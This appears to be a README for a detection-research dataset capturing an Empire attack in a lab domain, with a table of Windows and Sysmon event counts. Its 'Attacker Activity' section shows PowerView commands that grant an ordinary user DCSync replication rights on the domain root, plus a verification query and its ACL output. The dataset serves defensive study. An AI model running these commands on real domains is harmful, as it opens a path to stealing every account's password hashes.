# Empire DCSync ACL

An adversary with enough permissions (domain admin) can add an ACL to the Root Domain for any user, despite being in no privileged groups, having no malicious sidHistory, and not having local admin rights on the domain controller itself .

## Technique(s) ID

T1222

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_dcsync_acl.tar.gz](./empire_dcsync_acl.tar.gz)

## Network Environment

Shire

## Time Taken

2019-03-01125905

## About this file

| log_name                                 | task                                                   |   events_count  |
|------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | Pipeline Execution Details                             |             280 |
| Windows PowerShell                       | Provider Lifecycle                                     |               8 |
| Windows PowerShell                       | Engine Lifecycle                                       |               1 |
| Security                                 | Filtering Platform Connection                          |             181 |
| Security                                 | Token Right Adjusted Events                            |              93 |
| Security                                 | User Account Management                                |              11 |
| Security                                 | Detailed File Share                                    |               9 |
| Security                                 | Directory Service Changes                              |               6 |
| Security                                 | Group Membership                                       |               4 |
| Security                                 | Logoff                                                 |               4 |
| Security                                 | Logon                                                  |               4 |
| Security                                 | Special Logon                                          |               4 |
| Security                                 | Authentication Policy Change                           |               3 |
| Security                                 | Directory Service Access                               |               3 |
| Security                                 | Process Termination                                    |               3 |
| Security                                 | SAM                                                    |               3 |
| Security                                 | File Share                                             |               2 |
| Security                                 | Authorization Policy Change                            |               1 |
| Security                                 | Process Creation                                       |               1 |
| Microsoft-Windows-Sysmon/Operational     | Registry object added or deleted (rule: RegistryEvent) |             500 |
| Microsoft-Windows-Sysmon/Operational     | Image loaded (rule: ImageLoad)                         |             271 |
| Microsoft-Windows-Sysmon/Operational     | Process accessed (rule: ProcessAccess)                 |             149 |
| Microsoft-Windows-Sysmon/Operational     | Registry value set (rule: RegistryEvent)               |              70 |
| Microsoft-Windows-Sysmon/Operational     | Network connection detected (rule: NetworkConnect)     |              45 |
| Microsoft-Windows-Sysmon/Operational     | File created (rule: FileCreate)                        |              27 |
| Microsoft-Windows-Sysmon/Operational     | Pipe Connected (rule: PipeEvent)                       |              18 |
| Microsoft-Windows-Sysmon/Operational     | RawAccessRead detected (rule: RawAccessRead)           |               6 |
| Microsoft-Windows-Sysmon/Operational     | Process Create (rule: ProcessCreate)                   |               5 |
| Microsoft-Windows-PowerShell/Operational | Executing Pipeline                                     |             264 |


## Attacker Activity

```
scriptimport data/module_source/situational_awareness/network/powerview.ps1
scriptcmd Add-DomainObjectAcl -TargetIdentity "dc=shire,dc=com" -TargetDomain shire.com -PrincipalIdentity nmartha -Rights DCSync
```

You can verify that it worked by running the following commands:

```
scriptcmd $nmarthaSid = Get-DomainUser nmartha | Select-Object -ExpandProperty objectsid; Get-DomainObjectACL  "dc=shire,dc=com" -Domain shire.com -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $nmarthaSid}
```

```
AceQualifier           : AccessAllowed
ObjectDN               : DC=shire,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-2511471446-1103646877-3980648787
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2511471446-1103646877-3980648787-1106
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=shire,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-2511471446-1103646877-3980648787
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2511471446-1103646877-3980648787-1106
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=shire,DC=com
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-2511471446-1103646877-3980648787
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2511471446-1103646877-3980648787-1106
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
```